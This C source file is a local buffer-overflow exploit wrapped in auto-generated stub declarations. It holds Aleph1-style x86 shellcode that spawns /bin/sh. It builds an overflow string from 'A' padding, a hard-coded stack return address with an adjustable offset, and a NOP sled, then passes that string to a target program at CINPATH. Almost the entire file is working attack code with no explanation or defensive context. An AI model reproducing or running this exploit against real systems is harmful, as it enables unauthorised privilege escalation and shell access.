#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  egg_string ;

/* Variables and functions */
 int /*<<< orphan*/  CINPATH ; 
 unsigned long atoi (char*) ; 
 int /*<<< orphan*/  execl (int /*<<< orphan*/ ,char*,char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  memcpy (char*,char*,int) ; 
 int /*<<< orphan*/  strcpy (char*,char*) ; 
 int strlen (char*) ; 

int main(int argc, char **argv)
{
	/* Shellcode borrowed from Aleph1 */
	char shellcode[] =
		"\x29\xc0\x29\xdb\x29\xc9\x29\xd2\xb0\xa4\xcd\x80"
		"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89"
		"\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c"
		"\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff"
		"\xff\xff/bin/sh";

	char egg_string[300];
	int i;
	unsigned long offset = 0;

	if (argc > 1)
	{
		offset = atoi(argv[1]);
	}

	memcpy(egg_string, "tty", 3);

	for (i = 3; i < 95; i++)
		egg_string[i] = 'A';

	*(long *)(egg_string+95) = 0xbffff67c + offset; 

	for (i = 99; i < 300; i++)
		egg_string[i] = 0x90;

	strcpy(egg_string+(sizeof(egg_string)-strlen(shellcode)), shellcode);

	execl(CINPATH, "callin", egg_string, 0);
}